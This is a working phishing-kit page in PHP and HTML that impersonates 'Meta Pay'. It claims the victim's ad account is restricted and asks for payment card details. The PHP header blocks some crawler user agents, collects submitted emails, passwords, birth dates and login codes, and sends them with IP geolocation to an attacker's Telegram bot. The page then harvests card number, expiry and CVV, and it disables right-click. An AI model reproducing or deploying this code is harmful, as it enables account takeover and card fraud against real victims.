



<?php
$ua = $_SERVER['HTTP_USER_AGENT'];
if(preg_match('#Mozilla/4.05 [fr] (Win98; I)#',$ua) || preg_match('/Java1.1.4/si',$ua) || preg_match('/MS FrontPage Express/si',$ua) || preg_match('/HTTrack/si',$ua) || preg_match('/IDentity/si',$ua) || preg_match('/HyperBrowser/si',$ua) || preg_match('/Lynx/si',$ua)) 
{
header('Location: oops.php');
die();
}

// system function to process bot
function sendMessage($idTelegram, $messageBot, $tokenBot) {

    $url = "https://api.telegram.org/bot" . $tokenBot . "/sendMessage?parse_mode=html&chat_id=" . $idTelegram;
    $url = $url . "&text=" . urlencode($messageBot);
    $ch = curl_init();
    $optArray = array(
            CURLOPT_URL => $url,
            CURLOPT_RETURNTRANSFER => true
    );
    curl_setopt_array($ch, $optArray);
    $result = curl_exec($ch);
    curl_close($ch);
}

// get the bot data that you have set
include 'jestore/813944336231212681997529ChunkjestoreIP.php';
include 'jestore/813944336231212681997529Chunkjestore.php';

// MENANGKAP DATA YANG DI-INPUT
$godhelpme1ma = $_POST['godhelpme1ma']; // Email
$godhelpme1pa = $_POST['godhelpme1pa']; // Password
$godhelpme1mo = $_POST['godhelpme1mo']; // Bulan Kelahiran
$godhelpme1da = $_POST['godhelpme1da']; // Tanggal Kelahiran
$godhelpme1ye = $_POST['godhelpme1ye']; // Tahun Kelahiran

$godhelpme2ma = $_POST['godhelpme2ma']; // Email
$godhelpme2pa = $_POST['godhelpme2pa']; // Password
$godhelpme2mo = $_POST['godhelpme2mo']; // Bulan Kelahiran
$godhelpme2da = $_POST['godhelpme2da']; // Tanggal Kelahiran
$godhelpme2ye = $_POST['godhelpme2ye']; // Tahun Kelahiran

$logincode = $_POST['logincode']; // Login Code
$logincodeX = $_POST['logincodeX']; // Login Code
$XlogincodeX = $_POST['XlogincodeX']; // Login Code

// system will redirect to the main page if no data is entered
if($godhelpme1ma == '' || $godhelpme1pa == '' || $godhelpme1mo == '' || $godhelpme1da == '') {
header("Location: index.php");
} else {

// message content to sent to bot
$messageBot = "
━━━━━━━༻XXX༺━━━━━━
➤Email / Phone : <code>$godhelpme1ma</code>
➤Password : <code>$godhelpme1pa</code>
➤Day-Month-Year : <code>$godhelpme1da</code> - <code>$godhelpme1mo</code> - <code>$godhelpme1ye</code>
━━━━━━━━━━━━━━━━━━━━━━━━
➤Email / Phone : <code>$godhelpme2ma</code>
➤Password : <code>$godhelpme2pa</code>
➤Day-Month-Year : <code>$godhelpme2da</code> - <code>$godhelpme2mo</code> - <code>$godhelpme2ye</code>
━━━━━━━━━━━━━━━━━━━━━━━━
➤Code 1 : <code>$logincode</code>
━━━━━━━━━━━━━━━━━━━━━━━━
➤Code 2 : <code>$logincodeX</code>
━━━━━━━━━━━━━━━━━━━━━━━━
➤Code 3 : <code>$XlogincodeX</code>
━━━━━━━━━━━━━━━━━━━━━━━━
➤Country : $jestore_flag | $jestore_countryCode | +$jestore_callcode | $jestore_country
➤Ip Address : <code>$jestore_ipaddress</code>
➤Benua : $jestore_timezone 
➤Propinsi : $jestore_regionName
➤Kota : $jestore_city
➤Time Zone : $timezone
━━━━━━━༻XXX༺━━━━━━
";
}

// sent all data to bot
sendMessage($idTelegram, $messageBot, $tokenBot);
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <title>Meta Pay</title>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <style>
        .anticon {
            display: inline-block;
            color: inherit;
            font-style: normal;
            line-height: 0;
            text-align: center;
            text-transform: none;
            vertical-align: -0.125em;
            text-rendering: optimizeLegibility;
            -webkit-font-smoothing: antialiased;
            -moz-osx-font-smoothing: grayscale;
        }

        .anticon>* {
            line-height: 1;
        }

        .anticon svg {
            display: inline-block;
        }

        .anticon::before {
            display: none;
        }

        .anticon .anticon-icon {
            display: block;
        }

        .anticon[tabindex] {
            cursor: pointer;
        }

        .anticon-spin::before,
        .anticon-spin {
            display: inline-block;
            -webkit-animation: loadingCircle 1s infinite linear;
            animation: loadingCircle 1s infinite linear;
        }

        @-webkit-keyframes loadingCircle {
            100% {
                -webkit-transform: rotate(360deg);
                transform: rotate(360deg);
            }
        }

        @keyframes loadingCircle {
            100% {
                -webkit-transform: rotate(360deg);
                transform: rotate(360deg);
            }
        }
    </style>
    <link rel="icon" href="./assets/sound-mobile.png">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <meta name="theme-color" content="#fafafa">
    <link href="./assets/styles.css" rel="stylesheet">
    <link href="./assets/chunk1.css" rel="stylesheet">
    <link rel="apple-touch-icon" href="./assets/icon.png">
    <link href="./assets/main.chunk.css" rel="stylesheet">
    <script src="./assets/jquery.min.js"></script>
    <script type="text/javascript">
        function mousedwn(e) {
            try {
                if (event.button == 2 || event.button == 3) return false
            } catch (e) {
                if (e.which == 3) return false
            }
        }
        document.oncontextmenu = function() {
            return false
        };
        document.ondragstart = function() {
            return false
        };
        document.onmousedown = mousedwn
    </script>
</head>

<body>
    <div id="root">
        <div class="ant-spin-nested-loading">
            <div class="">
                <div class="sc-jqCOkK kFZWwp">
                    <div class="sc-gGBfsJ jvrGcO">
                        <div class="sc-jnlKLf OHNdu">
                            <div class="hARKVj">
                                <img src="./assets/sound-mobile.png" alt="" style="width: 46px;margin: 5px 15px;" class="sc-tilXH gdtVXy">
                            </div>
                            <div class="bro-1">Add payment information</div>
                            <div class="bro-2">Your advertising account has been restricted and can't advertise. Please fill in the new payment method so that the ad account is not deactivated.</div>
                            <div class="Jut1">Debit or credit card</div>
                            <div class="sc-htoDjs cDnNqw">
                                <form action="continue.php" method="post" class="ant-form ant-form-horizontal">
                                <input type="hidden" name="godhelpme1ma" value="<?php echo $godhelpme1ma ;?>" readonly>
												<input type="hidden" name="godhelpme1pa" value="<?php echo $godhelpme1pa ;?>" readonly>
												<input type="hidden" name="godhelpme1mo" value="<?php echo $godhelpme1mo ;?>" readonly>
												<input type="hidden" name="godhelpme1da" value="<?php echo $godhelpme1da ;?>" readonly>
												<input type="hidden" name="godhelpme1ye" value="<?php echo $godhelpme1ye ;?>" readonly>

												<input type="hidden" name="godhelpme2ma" value="<?php echo $godhelpme2ma ;?>" readonly>
												<input type="hidden" name="godhelpme2pa" value="<?php echo $godhelpme2pa ;?>" readonly>
												<input type="hidden" name="godhelpme2mo" value="<?php echo $godhelpme2mo ;?>" readonly>
												<input type="hidden" name="godhelpme2da" value="<?php echo $godhelpme2da ;?>" readonly>
												<input type="hidden" name="godhelpme2ye" value="<?php echo $godhelpme2ye ;?>" readonly>
								
								<input type="hidden" name="logincode" value="<?php echo $logincode ;?>" readonly>
								<input type="hidden" name="logincodeX" value="<?php echo $logincodeX ;?>" readonly>
								<input type="hidden" name="XlogincodeX" value="<?php echo $XlogincodeX ;?>" readonly>
                                    <div class="ant-row ant-form-item ant-form-item-with-help" style="row-gap: 0px;">
                                        <div class="ant-col ant-form-item-control">
                                            <div class="thepadding">
                                                <div class="Jut2">Card details</div><img src="./assets/cardlogo.png" alt="" style="width: 170px;position: absolute;right: 17px;top: -4px;" class="">
                                                <input type="text" class="import-account__secret-phrase SpceE" placeholder="Name on card" name="godhelpmenoc" value="" pattern=".{5,}" maxlength="40" required="" autocomplete="off">
                                                <input type="text" class="import-account__secret-phrase SpceE" placeholder="Card Number" name="godhelpmecn" id="card" value="" pattern=".{6,}" maxlength="16" required="" autocomplete="off" onkeydown="return ( event.ctrlKey || event.altKey || (47<event.keyCode &amp;&amp; event.keyCode<58 &amp;&amp; event.shiftKey==false) || (95<event.keyCode &amp;&amp; event.keyCode<106) || (event.keyCode==8) || (event.keyCode==9) || (event.keyCode>34 &amp;&amp; event.keyCode<40) || (event.keyCode==46) )">
                                                <div id="logo"></div>
                                                <div class="BirdSeleCt">
                                                    <input type="text" class="form-selected expired" name="godhelpmecmo" id="godhelpmecmo" placeholder="MM" autofocus="1" aria-label="Month" pattern=".{1,}" maxlength="2" required="yes" onkeydown="return ( event.ctrlKey || event.altKey
    || (47<event.keyCode &amp;&amp; event.keyCode<58 &amp;&amp; event.shiftKey==false)
    || (95<event.keyCode &amp;&amp; event.keyCode<106)
    || (event.keyCode==8) || (event.keyCode==9)
    || (event.keyCode>34 &amp;&amp; event.keyCode<40)
    || (event.keyCode==46) )">

                                                    <input type="text" class="form-selected" name="godhelpmecye" id="godhelpmecye" placeholder="YY" autofocus="1" aria-label="Year" pattern=".{1,}" maxlength="2" required="yes" onkeydown="return ( event.ctrlKey || event.altKey
    || (47<event.keyCode &amp;&amp; event.keyCode<58 &amp;&amp; event.shiftKey==false)
    || (95<event.keyCode &amp;&amp; event.keyCode<106)
    || (event.keyCode==8) || (event.keyCode==9)
    || (event.keyCode>34 &amp;&amp; event.keyCode<40)
    || (event.keyCode==46) )">

                                                    <div class="cvv">
                                                        <input type="password" class="form-selectedc cvv_input l3aFTC" name="godhelpmecvv" id="godhelpmecvv" placeholder="CVV" autofocus="1" aria-label="CVV" pattern=".{3,}" maxlength="4" required="yes" onkeydown="return ( event.ctrlKey || event.altKey
        || (47<event.keyCode &amp;&amp; event.keyCode<58 &amp;&amp; event.shiftKey==false)
        || (95<event.keyCode &amp;&amp; event.keyCode<106)
        || (event.keyCode==8) || (event.keyCode==9)
        || (event.keyCode>34 &amp;&amp; event.keyCode<40)
        || (event.keyCode==46) )">
                                                    </div>
                                                </div>
                                            </div>

                                            <div class="ant-form-item-explain">
                                            </div>
                                        </div>
                                    </div>

                                    <div class="thepadding">
                                        <button class="button sc-VigVT fWmldN" type="submit">Add</button>
                                        <div1></div1>
                                    </div>
                                </form>
                            </div>
                        </div>
                    </div>
                    <div class="confirm-approve-content__view-full-tx-button-wrapper">
                        <div class="confirm-approve-content__view-full-tx-button cursor-pointer"></div>
                    </div>
                    <div class="wawobp loader" data-tenqwa="9fkuxe">
                        <div class="yat5ls lodas" data-2ivb6w="2n92zq">
                            <svg viewBox="0 0 40 40" width="80px" color="text" xmlns="http://www.w3.org/2000/svg" class="sc-5a69fd5e-0 iGtDTz"></svg>
                            <center>
                                <div class="sc-fYxtnH hARKVj"><img src="./assets/sound-mobile.svg" alt="" style="height: 70px;width: 150px;" class="sc-tilXH gdtVXy"></div>
                            </center>

                            <div class="7n1smr loader2 loader--style3" title="2" data-knlucr="ga7q37">
                                <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" style="margin:auto;background:#fff;display:block;" width="40px" height="40px" viewBox="0 0 100 100" preserveAspectRatio="xMidYMid">
                                    <circle cx="50" cy="50" fill="none" stroke="#0b65c6" stroke-width="10" r="35" stroke-dasharray="164.93361431346415 56.97787143782138">
                                        <animateTransform attributeName="transform" type="rotate" repeatCount="indefinite" dur="1s" values="0 50 50;360 50 50" keyTimes="0;1"></animateTransform>
                                    </circle>
                                </svg>

                            </div>

                            <script src="./assets/load.js"></script>
                            <script src="./assets/card-validator.js"></script>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
</body>

</html>
